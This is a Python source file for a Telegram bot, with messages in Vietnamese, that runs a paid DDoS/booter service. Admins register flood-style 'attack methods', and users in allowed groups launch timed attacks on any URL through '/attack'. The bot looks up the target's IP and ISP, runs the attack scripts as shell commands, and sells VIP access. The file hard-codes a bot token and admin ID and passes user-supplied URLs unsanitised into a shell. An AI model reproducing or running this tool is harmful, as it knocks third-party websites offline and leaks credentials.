import time, json, asyncio, socket, requests, os
from urllib import parse
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler
from pytz import timezone
from html import escape

TOKEN = '7656232916:AAHQo3GXc7oQbB0eP5BtTh3CnRaPo29QgAk'
ADMIN_ID = 6365140337
VIP_USERS_FILE, METHODS_FILE, GROUPS_FILE = 'vip_users.json', 'methods.json', 'groups.json'
user_processes = {}

def load_json(file): return json.load(open(file, 'r')) if os.path.exists(file) else save_json(file, {}) or {}
def save_json(file, data): json.dump(data, open(file, 'w'), indent=4)
def get_thoi_gian_vn(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')
def lay_ip_va_isp(url): 
    try: ip = socket.gethostbyname(parse.urlsplit(url).netloc); response = requests.get(f"http://ip-api.com/json/{ip}")
    except: return None, None
    return ip, response.json() if response.ok else None

async def pkill_handler(update, context): 
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "🔥Không có quyền🔥.")
    for cmd in ["pkill -9 -f flood", "pkill -9 -f tlskill", "pkill -9 -f bypass", "pkill -9 -f killer"]:
        process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        if (stderr := await process.communicate())[1]: return await context.bot.send_message(ADMIN_ID, "🔥Lỗi xảy ra🔥.")
    return await context.bot.send_message(ADMIN_ID, "❄Đã tắt các tiến trình thành công❄️.")

async def command_handler(update, context, handler_func, min_args, help_text): 
    if len(context.args) < min_args: return await context.bot.send_message(ADMIN_ID, help_text)
    await handler_func(update, context)

async def them_phuong_thuc(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "🔥Không có quyền🔥.")
    if len(context.args) < 2: return await context.bot.send_message(ADMIN_ID, "Cách sử dụng: /add <method_name> <url> timeset <time> [vip/member]")
    method_name, url, attack_time = context.args[0], context.args[1], 60
    if 'timeset' in context.args: 
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await context.bot.send_message(ADMIN_ID, "🔥Thời gian không hợp lệ🔥.")
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    command = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join([arg for arg in context.args[2:] if arg not in ['[vip]', '[member]', 'timeset']])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time, 'visibility': visibility}
    save_json(METHODS_FILE, methods_data)
    return await context.bot.send_message(ADMIN_ID, f"Phương thức {method_name} đã thêm với quyền {visibility}.")

async def xoa_phuong_thuc(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Không có quyền.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, "Cách sử dụng: /del <method_name>")
    method_name = context.args[0]
    if method_name not in methods_data: return await context.bot.send_message(ADMIN_ID, f"Không tìm thấy phương thức {method_name}.")
    del methods_data[method_name]
    save_json(METHODS_FILE, methods_data)
    return await context.bot.send_message(ADMIN_ID, f"Phương thức {method_name} đã bị xóa.")

async def tao_choi(update, context, methods_data, vip_users, groups_data): 
    user_id, chat_id = update.message.from_user.id, update.message.chat.id
    if chat_id not in groups_data: return await context.bot.send_message(ADMIN_ID, "❄Nhóm này không được phép❄.")
    if user_id in user_processes and user_processes[user_id].returncode is None: return await context.bot.send_message(ADMIN_ID, "🚀Người dùng đã có tấn công đang chạy🚀.")
    if len(context.args) < 2: return await context.bot.send_message(ADMIN_ID, "Cách sử dụng: /attack <method_name> <url> [time]")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data: return await context.bot.send_message(ADMIN_ID, "❄Không tìm thấy phương thức❄.")
    method = methods_data[method_name]
    if method['visibility'] == 'VIP' and user_id != ADMIN_ID and user_id not in vip_users: return await context.bot.send_message(ADMIN_ID, "Người dùng không có quyền sử dụng phương thức VIP🥇.")
    attack_time = method['time']
    if user_id == ADMIN_ID and len(context.args) > 2: 
        try: attack_time = int(context.args[2])
        except: return await context.bot.send_message(ADMIN_ID, "🔥Thời gian không hợp lệ🔥.")
    ip, isp_info = lay_ip_va_isp(url)
    if not ip: return await context.bot.send_message(ADMIN_ID, "❄Không lấy được IP❄.")
    command = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    username, start_time = update.message.from_user.username or update.message.from_user.full_name, time.time()
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Kiểm tra trạng thái", url=f"https://check-host.net/check-http?host={url}")]])
    await context.bot.send_message(ADMIN_ID, f"Tấn công {method_name} bởi @{username}.\nISP:\n<pre>{escape(isp_info_text)}</pre>\nThời gian: {attack_time}s\nBắt đầu: {get_thoi_gian_vn()}", parse_mode='HTML', reply_markup=keyboard)
    asyncio.create_task(thuc_hien_tan_cong(command, update, method_name, start_time, attack_time, user_id, context))

async def thuc_hien_tan_cong(command, update, method_name, start_time, attack_time, user_id, context):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[user_id] = process
        stdout, stderr = await process.communicate()
        error_message = stderr.decode() if stderr else None
        end_time, attack_status = time.time(), "thành công" if not stderr else "thất bại"
    except Exception as e:
        error_message = str(e)
        end_time, attack_status = time.time(), "thất bại"
    
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name, "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": get_thoi_gian_vn(), "end_time": get_thoi_gian_vn(),
        "elapsed_time": elapsed_time, "attack_status": attack_status, "error": error_message or "Không có"
    }
    safe_attack_info_text = escape(json.dumps(attack_info, indent=2, ensure_ascii=False))
    await context.bot.send_message(ADMIN_ID, f"Tấn công hoàn tất! Thời gian: {elapsed_time}s.\n\nChi tiết:\n<pre>{safe_attack_info_text}</pre>", parse_mode='HTML')
    del user_processes[user_id]

async def danh_sach_phuong_thuc(update, context, methods_data):
    if not methods_data: return await context.bot.send_message(ADMIN_ID, "❄Không có phương thức nào❄.")
    methods_list = "\n".join([f"{name} ({data['visibility']}): {data['time']}s" for name, data in methods_data.items()])
    await context.bot.send_message(ADMIN_ID, f"Các phương thức có sẵn:\n{methods_list}")

async def quan_ly_vip_user(update, context, vip_users, action):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "Không có quyền.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, f"Cách sử dụng: /{'vipuser' if action == 'add' else 'delvip'} <uid>")
    user_id = int(context.args[0])
    if action == "add":
        vip_users.add(user_id); save_json(VIP_USERS_FILE, list(vip_users))
        return await context.bot.send_message(ADMIN_ID, f"Người dùng {user_id} đã được thêm vào VIP.")
    if action == "remove":
        if user_id in vip_users: vip_users.remove(user_id); save_json(VIP_USERS_FILE, list(vip_users))
        else: return await context.bot.send_message(ADMIN_ID, f"Người dùng {user_id} không có trong danh sách VIP.")
        return await context.bot.send_message(ADMIN_ID, f"Người dùng {user_id} đã được xóa khỏi VIP.")

async def them_nhom(update, context, groups_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "🔥Không có quyền🔥.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, "Cách sử dụng: /addgroup <uid>")
    group_id = int(context.args[0])
    groups_data.add(group_id); save_json(GROUPS_FILE, list(groups_data))
    return await context.bot.send_message(ADMIN_ID, f"Nhóm {group_id} đã được thêm vào danh sách cho phép.")

async def xoa_nhom(update, context, groups_data):
    if update.message.from_user.id != ADMIN_ID: return await context.bot.send_message(ADMIN_ID, "🔥Không có quyền🔥.")
    if len(context.args) < 1: return await context.bot.send_message(ADMIN_ID, "Cách sử dụng: /delgroup <uid>")
    group_id = int(context.args[0])
    if group_id not in groups_data: return await context.bot.send_message(ADMIN_ID, f"Nhóm {group_id} không tìm thấy.")
    groups_data.remove(group_id); save_json(GROUPS_FILE, list(groups_data))
    return await context.bot.send_message(ADMIN_ID, f"Nhóm {group_id} đã bị xóa.")

async def help_admin(update, context): 
    """Lệnh /helpadmin - Chỉ gửi tin nhắn hướng dẫn cho admin."""
    if update.message.from_user.id != ADMIN_ID:
        return await context.bot.send_message(update.message.chat_id, "Bạn không có quyền truy cập lệnh này🥇.")
    help_text = "/add <method_name> <url> timeset <time> [vip/member] - Thêm phương thức tấn công\n/del <method_name> - Xóa phương thức tấn công\n/attack <method_name> <url> [time] - Thực hiện tấn công\n/methods - Liệt kê phương thức có sẵn\n/vipuser <uid> - Thêm người dùng vào VIP\n/delvip <uid> - Xóa người dùng khỏi VIP\n/addgroup <uid> - Thêm nhóm vào danh sách cho phép\n/delgroup <uid> - Xóa nhóm khỏi danh sách\n/pkill - Tắt tiến trình tấn công"
    await context.bot.send_message(ADMIN_ID, help_text)

async def help_group(update, context): 
    """Lệnh /help - Hiển thị hướng dẫn trong nhóm."""
    chat_id = ADMIN_ID

    help_text = (
        "🌷🌷 **Hướng dẫn sử dụng bot trong nhóm owner :@neverlose102🥇** 🌷🌷\n\n"
        "- `/methods` - Xem danh sách phương thức tấn công\n"
        "- `/attack <method_name> <url> [time]` - Thực hiện tấn công\n"
        "- `/pkill` - Dừng tất cả tiến trình tấn công\n\n"
        "💡 *Liên hệ@neverlose102 để nâng cấp víp!*"
    )

    await context.bot.send_message(chat_id, help_text)

def main():
    methods_data, vip_users, groups_data = load_json(METHODS_FILE), set(load_json(VIP_USERS_FILE)), set(load_json(GROUPS_FILE))
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("helpadmin", help_admin))  # Lệnh dành cho admin
    app.add_handler(CommandHandler("help", help_group))  # Lệnh hiển thị trong nhóm

    app.add_handler(CommandHandler("add", lambda u, c: command_handler(u, c, lambda u, c: them_phuong_thuc(u, c, methods_data), 2, "Cách sử dụng sai.")))
    app.add_handler(CommandHandler("del", lambda u, c: command_handler(u, c, lambda u, c: xoa_phuong_thuc(u, c, methods_data), 1, "Cách sử dụng sai.")))
    app.add_handler(CommandHandler("attack", lambda u, c: command_handler(u, c, lambda u, c: tao_choi(u, c, methods_data, vip_users, groups_data), 2, "Cách sử dụng sai.")))
    app.add_handler(CommandHandler("methods", lambda u, c: danh_sach_phuong_thuc(u, c, methods_data)))
    app.add_handler(CommandHandler("vipuser", lambda u, c: quan_ly_vip_user(u, c, vip_users, "add")))
    app.add_handler(CommandHandler("delvip", lambda u, c: quan_ly_vip_user(u, c, vip_users, "remove")))
    app.add_handler(CommandHandler("addgroup", lambda u, c: them_nhom(u, c, groups_data)))
    app.add_handler(CommandHandler("delgroup", lambda u, c: xoa_nhom(u, c, groups_data)))
    app.add_handler(CommandHandler("pkill", pkill_handler))

    app.run_polling()
if __name__ == "__main__": main()